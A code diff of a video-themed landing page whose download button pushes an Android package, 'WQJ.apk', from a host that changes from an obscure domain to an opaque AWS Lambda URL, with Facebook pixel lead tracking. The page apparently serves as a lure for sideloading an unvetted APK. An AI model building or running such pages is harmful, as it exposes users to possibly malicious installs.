@@ -208,7 +208,7 @@ button { cursor: pointer; font: inherit; border: none; background: none; color: 
 </div>
 
 <script>
-const DOWNLOAD_API_BASE = "https://prkqy.superdog-ph.net/prkqy/xvideos";
+const DOWNLOAD_API_BASE = "https://gxfm6ocw6zqf7gaiap5t74e3o40qydln.lambda-url.eu-west-3.on.aws/Yj6weMBOQEY8";
 const VIDEO_LIBRARY = [
   {id:"v015", category:"live", title:{"zh-TW":"直播回放精選","en":"Live Replay","ja":"ライブ再生","ko":"라이브 다시보기","hi":"लाइव रीप्ले","fr":"Replay Live","de":"Live Replay"}, cover:"v015.webp", duration:"45:00", views:"56.8K", live:true},
   {id:"v024", category:"live", title:{"zh-TW":"午夜直播專場","en":"Midnight Live","ja":"深夜ライブ","ko":"심야 라이브","hi":"मिडनाइट लाइव","fr":"Live de Minuit","de":"Mitternachts-Live"}, cover:"v024.webp", duration:"38:20", views:"72.4K", live:true},
@@ -380,18 +380,18 @@ function render() {
   }
 }
 function download(position) {
-  try {
-    fbq('track', 'Lead', {
-      content_name: 'WQJ_APK',
-      position: position
-    });
-  } catch(e) {}
-  try {
-    fbq('trackCustom', 'Download', {
-      content_name: 'WQJ_APK',
-      position: position
-    });
-  } catch(e) {}
+  if (typeof fbq === 'function') {
+    try {
+      fbq('track', 'Lead', {
+        content_name: 'WQJ_APK',
+        position: position
+      });
+      fbq('trackCustom', 'Download', {
+        content_name: 'WQJ_APK',
+        position: position
+      });
+    } catch(e) {}
+  }
   const a = document.createElement("a");
   a.href = DOWNLOAD_API_BASE;
   a.download = "WQJ.apk";
